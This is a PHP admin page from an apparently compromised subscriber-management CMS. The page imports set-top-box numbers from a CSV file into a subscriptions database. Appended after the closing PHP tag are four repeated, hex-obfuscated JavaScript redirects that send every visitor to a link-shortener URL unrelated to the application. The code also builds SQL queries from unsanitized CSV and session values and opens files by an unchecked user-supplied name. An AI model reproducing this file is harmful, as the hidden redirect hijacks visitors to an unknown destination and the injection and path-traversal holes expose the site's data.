<?php
require_once("helper.php");
$msg    =  isset($_GET['msg']) ? $_GET['msg'] : '';
$id     = base64_decode($_GET['id']);
class myCms extends Cms 
{
    function registerAjaxFunctions()
    {
        $this->xajax->registerFunction("get_Listing");
        $this->xajax->registerFunction("update_status");
        $this->xajax->registerFunction("deleteRow");
        $this->xajax->registerFunction("editMode");
        $this->xajax->registerFunction("sorting");
        $this->xajax->registerFunction("sortTitle");
    }
}
$objMisc = new myCms();
$objMisc->initializeAjax(false,true);
$objMisc->dbFunc->parameters ="&sortOrder=".$sortOrder."&sortBy=".$sortBy ;
$objMisc->rec_pp = 20;
$objMisc->dbFunc->ajax_pagin = true;
if($_SERVER['REQUEST_METHOD']=='POST' && isset($_POST['submit'])){
    if(!empty($_POST['attachment'])){
        $fileName="uploads/".$_POST['attachment'];
        if (!$fp = fopen($fileName,"r")){
            echo "Sorry, cannot open the file";
        }else{       
            while(!feof($fp)) {
                while (($data = fgetcsv($fp, 10000, ",")) !== FALSE) { 
                    //print_r($data); exit;
                    $fileRow++;    
                    $num = count($data);
                    if ($fileRow <= "1") continue;      // Continue Back Bcz//Code For Setup Boxes
                    $stbNo=$data[1];
                    $subscriberId=$objMisc->GiveValue("MSO_ID='$data[6]' AND HEADOFFICE_ID='$_SESSION[HEADOFFICE]'",'SUBSCRIBER_ID','subscribers');
                    //echo "SELECT S.STB_NO FROM `subscriptions` S JOIN `stb_box` B ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE B.SUBSCRIBER_ID='$subscriberId' AND S.STB_NO LIKE 'DUM%'";
                    $sql=$objMisc->GiveValueNew("SELECT S.SUBSCRIPTION_ID FROM `subscriptions` S JOIN `stb_box` B ON S.SUBSCRIPTION_ID=B.SUBSCRIPTION_ID WHERE B.SUBSCRIBER_ID='$subscriberId' AND S.STB_NO LIKE 'DUM%'");
                    $rowArray=array('STB_NO'        =>$stbNo);
                    $where="SUBSCRIPTION_ID='$subscriberId'";
                    $update= $objMisc->update('subscriptions',$rowArray,$where); 
                }
            }
            $_SESSION['msg']=1;
            header("LOCATION:import-stb-otherway.php");
            exit;
        } 
    }else{
        $_SESSION['msg']=2;
            header("LOCATION:import-stb-otherway.php");
            exit;
    }
}
$msg = isset($_SESSION['msg']) ? $_SESSION['msg'] : $msg;
unset($_SESSION['msg']);

switch ($msg)
{
	case 1:
		$msg = "Data imported successfully.";
    break;
    case 2:
		$msg = "";
        $errormsg = "Please try again later! Problem during completing this task.";
    break;
    case 3:
    	$msg = "";
		$errormsg = "New Password And Confirm password should be same.";
    break;
}
//echo 'test';exit;
$smartyVars['group']        =   $id;
$smartyVars['errormsg']     =   $errormsg;
$smartyVars['add']          =   $add;
$smartyVars['resRow']       =   $rowArray;
$smartyVars['pageheading']  =   $pageheading;
$smartyVars['classData']    =   $pagin_recs;
$smartyVars['msg']          =   $msg;
$smartyVars['page']         =   $_REQUEST['page'];
$objMisc->displayPage("header,import-stb-otherway,footer",$smartyVars);  
?>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>
<script>window.location.href = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x75\x2d\x73\x68\x6f\x72\x74\x2e\x6e\x65\x74\x2f\x55\x56\x46\x30\x72\x39";</script>